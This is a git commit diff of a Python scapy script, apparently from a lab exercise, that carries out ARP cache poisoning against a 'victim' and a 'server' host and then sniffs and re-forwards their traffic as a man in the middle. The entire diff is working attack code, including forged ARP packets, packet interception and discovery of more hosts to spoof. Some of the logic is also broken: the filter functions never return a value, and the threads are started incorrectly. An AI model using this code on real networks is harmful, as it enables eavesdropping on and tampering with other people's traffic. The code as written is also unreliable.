fab5cce288dc8efc599efa8f38d97fc1be9f9a01
vorobyova1998 <alinavorobyova8@gmail.com>
2020-02-20 13:50:03 +0100

    Forwarding works properly

--- arpForward.py
+++ arpForward.py
@@ -1,16 +1,22 @@
 from scapy.all import *
 from scapy.layers.inet import IP, TCP
 import threading
+from threading import Lock
+import time
 
+lock = Lock()
+networkInterface = "enp0s3"
 victimIP = "192.168.56.101"
 victimMAC = "08:00:27:b0:a1:ab"
 
 serverIP = "192.168.56.102"
 serverMAC = "08:00:27:c6:a4:61"
 
-networkInterface = "enp0s3"
+attackerIP = get_if_addr(networkInterface)
+attackerMAC = get_if_hwaddr(networkInterface)
+
 interceptedPkt = []
-clients = []
+clients = {}
 
 
 def arpPoisoning(attackerIP, attackerMAC):
@@ -23,6 +29,21 @@ def arpPoisoning(attackerIP, attackerMAC):
 
     sendp(pktV, iface=networkInterface)
 
+    # clientsToSpoof(victimIP)
+
+    # lock.acquire()
+    # print(clients)
+    # lock.release()
+    # for ip, mac in clients:
+    #     pktS = Ether() / ARP()
+    #     pktS[Ether].src = attackerMAC
+    #     pktS[ARP].hwsrc = attackerMAC
+    #     pktS[ARP].psrc = victimIP
+    #     pktS[ARP].hwdst = mac
+    #     pktS[ARP].pdst = ip
+    #
+    #     sendp(pktS, iface=networkInterface)
+
     pktS = Ether() / ARP()
     pktS[Ether].src = attackerMAC
     pktS[ARP].hwsrc = attackerMAC
@@ -31,23 +52,44 @@ def arpPoisoning(attackerIP, attackerMAC):
     pktS[ARP].pdst = serverIP
 
     sendp(pktS, iface=networkInterface)
+    time.sleep(10)
+
+def snifFilter(pkt):
+    if (pkt.haslayer(TCP) and pkt[Ether].dst == attackerMAC and (
+             pkt[IP].dst in clients.values() or pkt[IP].dst == victimIP)):
+        True
+    else:
+        False
 
 
-def arpSniffing(attackerIP, attackerMAC):
+def arpSniffing(attackerMAC):
     def intercept(pkt):
         interceptedPkt.append(pkt)
-        if (pkt.haslayer(TCP) and pkt[Ether].dst == attackerMAC and (
-                pkt[IP].dst == serverIP or pkt[IP].dst == victimIP)):
-            if pkt[IP].dst == serverIP:
-                pkt[Ether].dst = serverMAC
-            else:
-                pkt[Ether].dst = victimMAC
+        if pkt[IP].dst == serverIP:
+            pkt[Ether].dst = serverMAC
+        else:
+            pkt[Ether].dst = victimMAC
 
         pkt[Ether].src = attackerMAC
         sendp(pkt, iface=networkInterface)
 
-    sniff(prn=intercept, iface=networkInterface, filter="arp")
-    print("finish")
+    sniff(prn=intercept, iface=networkInterface, filter="arp", lfilter = snifFilter)
+
+def snifClientFilter(pkt):
+    if (pkt.haslayer(TCP) and pkt[IP].dst not in clients.values()):
+        True
+    else:
+        False
+
+def clientsToSpoof(victimIP):
+    def intercept(pkt):
+        lock.acquire()
+        print(pkt[ARP].pdst)
+        getMAC(pkt[ARP].pdst)
+        lock.release()
+
+    sniff(prn=intercept, iface=networkInterface, filter="arp", lfilter = snifClientFilter)
+
 
 
 def arp(attackerIP, attackerMAC):
@@ -55,9 +97,14 @@ def arp(attackerIP, attackerMAC):
     poisonThread.daemon = True
     poisonThread.start()
 
-    # sniffThread = threading.Thread(target = arpSniffing(attackerIP, attackerMAC))
-    # sniffThread.daemon = True
-    # sniffThread.start()
+    # clientThread = threading.Thread(target=clientsToSpoof(victimIP))
+    # clientThread.daemon = True
+    # clientThread.start()
+
+    sniffThread = threading.Thread(target = arpSniffing(attackerMAC))
+    sniffThread.daemon = True
+    sniffThread.start()
+
 
 
 def getMAC(victinIP):
@@ -69,12 +116,11 @@ def getMAC(victinIP):
     result = srp(pkt, iface=networkInterface, timeout=2, inter=0.1)[0]
 
     for sent, received in result:
-        clients.append({"ip": received.psrc, "mac": received.hwsrc})
+        if received.hwsrc not in clients.keys():
+            clients[received.hwsrc] = received.psrc
 
 
 def main():
-    attackerIP = get_if_addr(networkInterface)
-    attackerMAC = get_if_hwaddr(networkInterface)
     arp(attackerIP, attackerMAC)
 
 
